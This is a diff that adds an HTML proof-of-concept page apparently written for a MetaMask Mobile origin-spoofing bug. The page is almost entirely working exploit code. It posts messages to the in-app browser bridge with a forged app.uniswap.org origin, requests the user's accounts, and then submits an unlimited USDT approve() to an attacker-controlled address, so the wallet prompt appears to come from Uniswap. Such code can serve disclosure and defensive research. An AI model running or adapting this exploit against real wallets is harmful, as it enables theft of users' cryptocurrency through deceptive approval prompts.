@@ -1,0 +1,54 @@
+  <html>
+  <head>
+      <title>MetaMask Origin Spoof PoC</title>
+  </head>
+  <body>
+      <h3>MetaMask Mobile Origin Spoofing PoC</h3>
+      <button onclick="exploit()">Trigger Exploit</button>
+      <pre id="log"></pre>
+
+      <script>
+          const SPOOFED_ORIGIN = 'https://app.uniswap.org';
+          const ATTACKER = '0x1234567890123456789012345678901234567890';
+
+          function log(msg) {
+              document.getElementById('log').textContent += msg + '\n';
+              console.log(msg);
+          }
+
+          function exploit() {
+              if (!window.ReactNativeWebView) {
+                  log('ERROR: Not in MetaMask Mobile browser');
+                  return;
+              }
+
+              // Get accounts with spoofed origin
+              window.ReactNativeWebView.postMessage(JSON.stringify({
+                  name: 'metamask-provider',
+                  origin: SPOOFED_ORIGIN,
+                  data: { jsonrpc: '2.0', id: 1, method: 'eth_requestAccounts', params: [] }
+              }));
+              log('Sent spoofed eth_requestAccounts');
+
+              // Malicious approval (USDT unlimited approve to attacker)
+              setTimeout(() => {
+                  window.ReactNativeWebView.postMessage(JSON.stringify({
+                      name: 'metamask-provider',
+                      origin: SPOOFED_ORIGIN,
+                      data: {
+                          jsonrpc: '2.0',
+                          id: 2,
+                          method: 'eth_sendTransaction',
+                          params: [{
+                              to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                              data: '0x095ea7b3000000000000000000000000' + ATTACKER.slice(2) + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
+                          }]
+                      }
+                  }));
+                  log('Sent spoofed unlimited USDT approval');
+                  log('UI will show request from: ' + SPOOFED_ORIGIN);
+              }, 1000);
+          }
+      </script>
+  </body>
+  </html>
